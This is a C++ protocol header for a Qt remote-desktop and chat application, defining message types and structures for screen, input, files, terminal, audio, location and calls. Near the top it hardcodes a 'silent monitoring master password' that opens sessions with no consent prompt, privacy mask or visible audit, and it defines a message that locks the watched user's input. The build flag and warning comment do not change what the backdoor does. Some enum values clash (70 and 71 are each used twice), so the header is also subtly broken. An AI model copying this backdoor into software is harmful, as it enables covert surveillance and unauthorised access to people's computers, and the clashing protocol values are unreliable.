#pragma once

#include <QString>
#include <QImage>
#include <QDateTime>
#include <QPoint>
#include <cstdint>

namespace xrk {

constexpr uint32_t MAGIC = 0x58524B00;
constexpr uint32_t PROTOCOL_VERSION = 1;
constexpr uint16_t DEFAULT_PORT = 9999;
constexpr uint16_t UDP_BROADCAST_PORT = 9998;
constexpr uint16_t P2P_PORT = 9997; // dedicated port for P2P TCP hole-punching (simultaneous open)

// Silent-monitoring master password. When a controller authenticates with this
// exact string the Host grants a *silent* session (plan §2): no consent dialog,
// no privacy mask, no visible audit/UI. It is purely a mode selector — normal
// password authentication is unchanged.
// WARNING: a hardcoded backdoor with this much power is a serious
// security/compliance risk. All silent-mode code paths are therefore gated
// behind XRK_ENABLE_SILENT and are NOT compiled into release builds by default.
#ifdef XRK_ENABLE_SILENT
constexpr char SILENT_MASTER_PASSWORD[] = "95279527";
#endif

enum class MessageType : uint32_t {
    DEVICE_DISCOVER_REQ = 0,
    DEVICE_DISCOVER_RESP = 1,
    CONNECT_REQ = 10,
    CONNECT_RESP = 11,
    DISCONNECT_REQ = 12,
    AUTH_REQ = 13,
    AUTH_RESP = 14,
    SCREEN_FRAME = 20,
    SCREEN_FRAME_ACK = 21,
    QUALITY_INFO = 22,
    SCREEN_TILE = 23,       // incremental tiled update (weak-network differential transport)
    SCREEN_KEYFRAME = 24,   // full-screen keyframe batch marker (all tiles)
    SCREEN_TILE_REQUEST = 25, // NACK: client asks host to resend specific tiles (by x,y)
    MOUSE_EVENT = 30,
    KEY_EVENT = 31,
FILE_REQ = 40,
     FILE_DATA = 41,
     FILE_ACK = 42,
     FILE_CHECKSUM = 43,
     CLIPBOARD_DATA = 50,
    CLIPBOARD_ACK = 51,
    MONITOR_LIST = 60,
    MONITOR_SWITCH = 61,
    MONITOR_SWITCH_ACK = 62,
    MONITOR_REFRESH = 63,
    MONITOR_AUTO_SWITCH_START = 64,   // Start auto-switch cycling
    MONITOR_AUTO_SWITCH_STOP = 65,    // Stop auto-switch cycling
    MONITOR_AUTO_SWITCH_PAUSE = 66,   // Pause on current monitor
    MONITOR_AUTO_SWITCH_RESUME = 67,  // Resume cycling from current position
    MONITOR_AUTO_SWITCH_CONFIG = 68,  // Set interval and mode
    MONITOR_AUTO_SWITCH_STATUS = 69,  // Report current auto-switch state
    MONITOR_THUMBNAIL_REQUEST = 70,   // Request thumbnail for a monitor
    MONITOR_THUMBNAIL_FRAME = 71,     // Thumbnail frame data
    ENCRYPTION_KEY_EXCHANGE = 70,
    ENCRYPTION_KEY_RESPONSE = 71,
    CHAT_MESSAGE = 80,
    CHAT_ACK = 81,
    SCREENSHOT_REQ = 90,
    SCREENSHOT_RESP = 91,
    HEARTBEAT = 100,
    HEARTBEAT_RESP = 101,
    TERMINAL_START = 110,
    TERMINAL_STOP = 111,
    TERMINAL_INPUT = 112,
    TERMINAL_OUTPUT = 113,
    TERMINAL_ACK = 114,
    
    RECORD_START = 120,
    RECORD_STOP = 121,
    RECORD_ACK = 122,
    
    CAMERA_MODE = 130,
    
AUDIO_START = 140,
    AUDIO_STOP = 141,
    AUDIO_DATA = 142,

    VOICE_MSG = 143,
    VOICE_ACK = 144,

    VIDEO_MSG = 145,
    VIDEO_ACK = 146,

    LOCATION_MSG = 147,
    LOCATION_ACK = 148,

    CARD_MSG = 149,
    CARD_ACK = 150,

    MERGE_FORWARD = 151,
    MERGE_FORWARD_ACK = 152,

    CALL_INVITE = 153,
    CALL_ACCEPT = 154,
    CALL_REJECT = 155,
    CALL_END = 156,
    ICE_CANDIDATE = 157,

    VIDEO_CALL_START = 250,
    VIDEO_CALL_STOP = 251,
    VIDEO_CALL_FRAME = 252,
    VIDEO_CALL_ACK = 253,

    SCREEN_SHARE_START = 254,
    SCREEN_SHARE_STOP = 255,
    SCREEN_SHARE_FRAME = 256,
    SCREEN_SHARE_ACK = 257,

    GROUP_ANNOUNCEMENT = 258,
    GROUP_MENTION = 259,
    GROUP_VOTE = 260,

    GROUP_FILE = 261,
    GROUP_FILE_ACK = 262,
    GROUP_ALBUM = 263,
    GROUP_ALBUM_ACK = 264,

    GROUP_TODO = 265,
    GROUP_TODO_ACK = 266,
    GROUP_TODO_UPDATE = 267,

    POWER_COMMAND = 158,
    FILE_BROWSER_REQ = 160,
    FILE_BROWSER_RESP = 161,
    SYSINFO_REQ = 170,
    SYSINFO_RESP = 171,
    PRIVACY_SCREEN = 180,
    SET_QUALITY = 181,
    INPUT_BLOCK = 182,      // silent monitoring: controller locks the controlled machine's local KB/mouse
    CONSENT_REQUEST = 190,
    CONSENT_RESPONSE = 191,
    SYNC_ADD = 200,        // controller -> host: start watching a host dir (reverse sync)
    SYNC_REMOVE = 201,     // controller -> host: stop watching a host dir
    SYNC_NOTIFY = 202,      // host -> controller: a watched host file changed

    // Multi-device sync (Phase E1)
    SYNC_REQUEST = 203,    // request sync snapshot from peer
    SYNC_SNAPSHOT = 204,   // sync snapshot data (devices, groups, settings, messages)
    SYNC_ACK = 205,        // sync acknowledgment

    // E2EE (End-to-End Encryption) message types
    E2EE_KEY_EXCHANGE = 300,
    E2EE_KEY_RESPONSE = 301,
    E2EE_SESSION_ESTABLISHED = 302,
    E2EE_MESSAGE = 303,
    E2EE_ACK = 304
};

enum class PowerAction : uint8_t {
    SHUTDOWN = 1,
    RESTART = 2,
    LOGOUT = 3,
    SLEEP = 4,
    HIBERNATE = 5,
    LOCK = 6
};

enum class FrameFormat : uint32_t {
    JPEG = 0,
    H264 = 1,
    H265 = 2
};

// How a remote session's data channel was established.
enum class TransportType : uint8_t {
    Unknown = 0,
    Lan = 1,        // direct LAN (IP connect)
    P2P = 2,        // direct P2P over the internet (hole punch succeeded)
    Relay = 3       // relayed through the relay server (fallback)
};

enum class MouseAction : uint32_t {
    MOVE = 0,
    CLICK = 1,
    DOUBLECLICK = 2,
    PRESS = 3,
    RELEASE = 4,
    SCROLL = 5
};

enum class MouseButton : uint32_t {
    LEFT = 0,
    RIGHT = 1,
    MIDDLE = 2
};

enum class QualityLevel : uint8_t {
    AUTO = 0,
    ADAPTIVE = 1,
    LOW = 2,
    MEDIUM = 3,
    HIGH = 4,
    ULTRA = 5
};

struct QualityInfo {
    int jpegQuality = 70;
    int captureFps = 30;
    int targetFps = 30;
    int bandwidthKbps = 0;
    int64_t roundTripMs = 0;
};

// Controller -> Host request to pin a quality/latency gear. When level is
// AUTO/ADAPTIVE the host resumes its measured bandwidth adaptation; otherwise
// it locks jpegQuality/captureFps (and, in gameMode, prefers the H264 encoder
// at a higher frame rate for lower interactive latency).
struct QualityRequest {
    QualityLevel level = QualityLevel::AUTO;
    bool gameMode = false;
};

// Reverse real-time sync: a pair (hostDir watched on the controlled machine,
// localDir on the controller where changes should land).
struct SyncPair {
    QString hostDir;
    QString localDir;
};

// Host -> Controller notification that a watched host file changed. The
// controller downloads hostFilePath into localDir, preserving the relative
// sub-path under hostDir.
// Host -> Controller notification that a watched host file changed. The
// controller downloads hostFilePath into localDir, preserving the relative
// sub-path under hostDir.
struct SyncNotify {
    QString hostDir;
    QString hostFilePath;
    QString localDir;
    uint64_t size = 0;
    int64_t mtime = 0;
};

// Multi-device sync (Phase E1): request a full state snapshot from a peer.
struct SyncRequest {
    QString requestId;
    QString accountHash;
    QString syncKeyHash;
    qint64 timestamp = 0;
};

// Multi-device sync (Phase E1): complete state snapshot for LWW merge.
struct SyncSnapshot {
    qint64 version = 0;  // Lamport-style logical clock

    struct Device {
        QString deviceId;
        QString name;
        QString ip;
        quint16 port = 0;
        qint64 lastSeen = 0;
        qint64 updatedAt = 0;
        bool isFriend = false;
    };
    QList<Device> devices;

    struct Group {
        QString groupId;
        QString name;
        QList<QString> memberIds;
        QList<QString> memberNames;
        qint64 createdAt = 0;
        qint64 updatedAt = 0;
    };
    QList<Group> groups;

    struct Setting {
        QString key;
        QString value;
        qint64 updatedAt = 0;
    };
    QList<Setting> settings;

    struct Message {
        QString messageId;
        QString senderId;
        QString senderName;
        QString senderIp;
        QString content;
        qint64 timestamp = 0;
        bool isFile = false;
        QString filePath;
        qint64 fileSize = 0;
        bool isDirectory = false;
        bool isImage = false;
        QString imageFileName;
        QString replyTo;
        QString replyContent;
        QString recallId;
        bool isRecalled = false;
        QString targetId;
        bool isGroup = false;
        bool isRead = false;
        QString readBy;
    };
    QList<Message> messages;
};

// Multi-device sync (Phase E1): acknowledgment of received snapshot.
struct SyncAck {
    QString requestId;
    bool success = false;
    int appliedCount = 0;
    QString errorMessage;
};

struct DeviceInfo {
    enum class ArpStatus {
        Unknown,   // not yet resolved
        Pending,   // ARP resolution in flight
        Resolved,  // macAddress populated
        Timeout    // resolution failed / timed out (no MAC)
    };

    QString deviceId;
    QString deviceName;
    QString ipAddress;
    uint16_t port = DEFAULT_PORT;
    QString version;
    QString accessCode;
    QString macAddress;   // resolved via ARP from ipAddress
    ArpStatus arpStatus = ArpStatus::Unknown;
    qint64 timestamp = 0;
};
Q_DECLARE_METATYPE(DeviceInfo)

struct MessageHeader {
    uint32_t magic = MAGIC;
    uint32_t version = PROTOCOL_VERSION;
    MessageType type = MessageType::HEARTBEAT;
    uint32_t length = 0;
    uint64_t timestamp = 0;
    QString sessionId;
};

struct MouseEvent {
    int32_t x = 0;
    int32_t y = 0;
    MouseAction action = MouseAction::MOVE;
    MouseButton button = MouseButton::LEFT;
    int32_t delta = 0;
};

struct KeyEvent {
    uint32_t keyCode = 0;
    bool pressed = false;
    uint32_t modifiers = 0;
    // The actual typed character(s) from the controller (Qt QKeyEvent::text()).
    // Sent in addition to keyCode so the host can inject the exact Unicode
    // character via KEYEVENTF_UNICODE, making remote typing independent of the
    // host's active keyboard layout / IME. Empty for non-character keys
    // (modifiers, F-keys, arrows, etc.), which fall back to keyCode (VK).
    QString text;
};

struct ScreenFrame {
    QByteArray data;
    uint32_t width = 0;
    uint32_t height = 0;
    FrameFormat format = FrameFormat::JPEG;
    uint64_t timestamp = 0;
};

// Square tile size used by the differential tiled transport. 64x64 (4KB RGB32)
// aligns with RDP's bitmap-cache tile size and keeps each tile packet small so
// a single lost tile only costs one tiny retransmit/keyframe resync.
constexpr int TILE_SIZE = 64;

// How a single screen tile is encoded. UI/text tiles (few colours) go lossless
// (RLE); photographic / video tiles go lossy JPEG at an adaptive quality.
enum class TileEncoding : uint8_t {
    JPEG = 0,
    RLE = 1,
    RAW = 2
};

// One self-describing screen tile. A tiled update sends only the tiles whose
// content changed since the client last acknowledged them; the client reuses
// its tile cache for everything else. `seq` is the host's global version of
// this tile (x,y); `hash` lets the client verify integrity and NACK corruption.
struct ScreenTile {
    uint32_t x = 0;
    uint32_t y = 0;
    uint32_t w = 0;
    uint32_t h = 0;
    uint32_t seq = 0;            // global tile version (host side)
    uint32_t frameWidth = 0;     // full desktop size, so the client can size its canvas
    uint32_t frameHeight = 0;
    uint8_t isKeyFrame = 0;      // 1 if this tile belongs to a full-screen keyframe batch
    uint8_t encoding = 0;        // TileEncoding
    uint8_t format = 0;          // underlying FrameFormat (reserved)
    uint64_t timestamp = 0;
    QByteArray hash;              // MD5 of data (integrity / NACK)
    QByteArray data;
};

// Host <- Controller NACK: ask the host to resend only the listed tiles (by
// their x,y position in the frame grid). `frameWidth`/`frameHeight` let the host
// resolve the coordinates against its current capture frame. Targeted repair is
// far cheaper than a full keyframe and is what the controller sends when it
// detects a corrupt or dropped tile.
struct ScreenTileRequest {
    uint32_t frameWidth = 0;
    uint32_t frameHeight = 0;
    QList<QPoint> tiles;          // requested (x, y) tile positions
};

// Controller -> Host feedback for the adaptive network loop. Carries RTT and
// per-window tile loss so the host can drive quality / fps / tile budget.
struct ScreenAck {
    uint64_t timestamp = 0;      // echo of last received frame timestamp
    int64_t roundTripMs = 0;
    uint32_t tilesReceived = 0;
    uint32_t tilesLost = 0;
    uint32_t bufferLevel = 0;    // 0..100 client decode-buffer fullness
};

// A captured frame plus the changed regions reported by the capture API
// (DXGI Desktop Duplication dirty/move rects). When dirtyRects is empty the
// encoder falls back to a software downscaled diff to find changed tiles.
struct CapturedFrame {
    QImage image;
    QList<QRect> dirtyRects;
};

struct SessionInfo {
    QString sessionId;
    QString deviceId;
    QDateTime startTime;
    bool active = false;
    TransportType transport = TransportType::Unknown;
};

struct FileRequest {
    QString fileId;
    QString fileName;
    QString path;        // Full remote path (used for download); empty for basename-only use
    uint64_t fileSize = 0;
    uint64_t offset = 0;
    bool isUpload = true;
};

struct FileData {
    QString fileId;
    QByteArray data;
    uint64_t offset = 0;
};

struct ClipboardData {
    QString mimeType;
    QByteArray data;
    uint64_t timestamp = 0;
};

struct MonitorInfo {
    int32_t index = 0;
    QString name;
    int32_t x = 0;
    int32_t y = 0;
    int32_t width = 0;
    int32_t height = 0;
    bool isPrimary = false;
};

struct ChatMessage {
    QString sender;
    QString content;
    uint64_t timestamp = 0;
};

struct EncryptionKeyExchange {
    QByteArray publicKey;
    QByteArray nonce;
};

struct TerminalData {
    QString data;
    uint32_t cols = 80;
    uint32_t rows = 25;
    QString shellType = "cmd";
};

struct RecordControl {
    QString filePath;
    int fps = 30;
};

struct FileBrowserEntry {
    QString name;
    QString path;
    bool isDir = false;
    uint64_t fileSize = 0;
    QString lastModified;
};

struct FileBrowserRequest {
    QString path;
    QString filter;
};

struct FileBrowserResponse {
    QString path;
    QList<FileBrowserEntry> entries;
    bool success = false;
    QString errorMessage;
};

struct SysInfo {
    double cpuUsage = 0;          // 0-100%
    double memoryUsage = 0;       // 0-100%
    uint64_t memoryTotal = 0;     // bytes
    uint64_t memoryAvailable = 0;
    double diskUsage = 0;         // 0-100%
    uint64_t diskTotal = 0;       // bytes
    uint64_t diskFree = 0;
    uint64_t networkRx = 0;       // bytes
    uint64_t networkTx = 0;
    QString osName;
    QString osVersion;
    QString cpuName;
    uint64_t uptime = 0;          // seconds
    int processCount = 0;
};

struct VoiceMessage {
    QString messageId;
    QString senderId;
    QString senderName;
    QByteArray voiceData;
    QString voiceFileName;
    int duration = 0; // in seconds
    qint64 timestamp = 0;
    bool isRead = false;
};

struct VideoMessage {
    QString messageId;
    QString senderId;
    QString senderName;
    QByteArray videoData;
    QString videoFileName;
    int duration = 0; // in seconds
    double width = 0;
    double height = 0;
    qint64 timestamp = 0;
    bool isRead = false;
};

struct LocationMessage {
    QString messageId;
    QString senderId;
    QString senderName;
    double latitude = 0;
    double longitude = 0;
    QString locationName;
    qint64 timestamp = 0;
    bool isRead = false;
};

struct CardMessage {
    QString messageId;
    QString senderId;
    QString senderName;
    QString vCardData;
    qint64 timestamp = 0;
    bool isRead = false;
};

struct ForwardedMessage {
    QString messageId;
    QString senderId;
    QString senderName;
    QString content;
    qint64 timestamp = 0;
    int msgType = 0; // 0=text, 1=image, 2=voice, 3=video, 4=location, 5=card
};

struct MergeForwardMessage {
    QString messageId;
    QString senderId;
    QString senderName;
    QList<ForwardedMessage> messages;
    qint64 timestamp = 0;
    bool isRead = false;
};

struct CallInvite {
    QString callId;
    QString callerId;
    QString callerName;
    QString callType; // "voice" or "video"
    QString sdp;      // SDP offer
    qint64 timestamp = 0;
};

struct CallAccept {
    QString callId;
    QString calleeId;
    QString sdp;      // SDP answer
    qint64 timestamp = 0;
};

struct CallReject {
    QString callId;
    QString calleeId;
    QString reason;
    qint64 timestamp = 0;
};

struct CallEnd {
    QString callId;
    QString peerId;
    qint64 timestamp = 0;
};

struct IceCandidate {
    QString callId;
    QString candidate; // ICE candidate SDP
    qint64 timestamp = 0;
};

struct VideoCallStart {
    QString callId;
    QString callerId;
    QString callerName;
    int width = 0;
    int height = 0;
    int fps = 30;
    qint64 timestamp = 0;
};

struct VideoCallStop {
    QString callId;
    QString peerId;
    qint64 timestamp = 0;
};

struct VideoCallFrame {
    QString callId;
    QByteArray frameData; // H.264 encoded frame
    uint64_t timestamp = 0; // RTP timestamp
    uint32_t sequenceNumber = 0;
    bool isKeyFrame = false;
    qint64 captureTime = 0;
};

struct ScreenShareStart {
    QString sessionId;
    QString callerId;
    QString callerName;
    int width = 0;
    int height = 0;
    int fps = 30;
    qint64 timestamp = 0;
};

struct ScreenShareStop {
    QString sessionId;
    QString peerId;
    qint64 timestamp = 0;
};

struct ScreenShareFrame {
    QString sessionId;
    QByteArray frameData; // H.264 encoded frame
    uint64_t timestamp = 0; // RTP timestamp
    uint32_t sequenceNumber = 0;
    bool isKeyFrame = false;
    qint64 captureTime = 0;
};

struct GroupAnnouncement {
    QString groupId;
    QString groupName;
    QString announcement;
    QString announcerId;
    QString announcerName;
    qint64 timestamp = 0;
};

struct GroupMention {
    QString groupId;
    QString groupName;
    QString message;
    QStringList mentionedMemberIds;
    QStringList mentionedMemberNames;
    QString senderId;
    QString senderName;
    qint64 timestamp = 0;
};

struct GroupVote {
    QString groupId;
    QString groupName;
    QString voteTitle;
    QStringList options;
    int durationSeconds = 0;
    QString creatorId;
    QString creatorName;
    qint64 timestamp = 0;
};

struct GroupFile {
    QString groupId;
    QString groupName;
    QString fileId;
    QString fileName;
    qint64 fileSize = 0;
    QString md5;
    QString uploaderId;
    QString uploaderName;
    qint64 timestamp = 0;
};

struct GroupAlbum {
    QString groupId;
    QString groupName;
    QString albumId;
    QString albumName;
    QStringList fileIds;
    QStringList fileNames;
    QString creatorId;
    QString creatorName;
    qint64 timestamp = 0;
};

struct GroupTodo {
    QString groupId;
    QString groupName;
    QString todoId;
    QString title;
    QString description;
    int status = 0; // 0=pending, 1=in_progress, 2=completed
    int priority = 0; // 0=low, 1=medium, 2=high
    QString assigneeId;
    QString assigneeName;
    QString creatorId;
    QString creatorName;
    qint64 dueDate = 0;
    qint64 timestamp = 0;
};

struct ContactInfo {
    QString contactId;
    QString displayName;
    QString avatarPath;
    QString ipAddress;
    quint16 port = DEFAULT_PORT;
    QString deviceName;
    QString note;
    bool online = false;
    qint64 lastSeen = 0;
    QStringList groups;
};
Q_DECLARE_METATYPE(ContactInfo)

struct EmojiReaction {
    QString messageId;
    QString emoji;
    QString userId;
    QString userName;
    qint64 timestamp = 0;
};

} // namespace xrk
